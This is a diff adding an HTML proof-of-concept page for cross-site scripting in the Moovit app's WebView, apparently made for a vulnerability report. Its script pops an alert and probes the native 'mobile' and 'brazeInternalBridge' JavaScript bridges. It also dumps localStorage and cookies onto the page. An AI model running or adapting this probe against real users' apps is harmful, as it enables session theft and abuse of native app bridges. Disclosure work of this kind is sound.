@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#1a1a2e;color:#eee;font-family:monospace;padding:30px">
+<h1 style="color:#e94560">&#x26A0; XSS in Moovit WebView</h1>
+<pre id="out">Probing...</pre>
+<script>
+var out = document.getElementById('out');
+function log(m) { out.innerText += m + '\n'; }
+
+alert('XSS - JS executing in Moovit WebView context!\nOrigin: ' + location.origin);
+
+log('Origin: ' + location.origin);
+log('UA: ' + navigator.userAgent);
+
+// Probe mobile JS bridge
+try { mobile.closeWebView(); log('[+] mobile.closeWebView() - ACCESSIBLE'); }
+catch(e) { log('[?] mobile: ' + e); }
+
+// Probe brazeInternalBridge
+try { brazeInternalBridge; log('[+] brazeInternalBridge - ACCESSIBLE'); }
+catch(e) { log('[-] brazeInternalBridge: not accessible'); }
+
+// localStorage
+try { log('[+] localStorage: ' + JSON.stringify(localStorage)); }
+catch(e) { log('[-] localStorage: ' + e); }
+
+log('cookies: ' + (document.cookie || 'none'));
+</script>
+</body>
+</html>
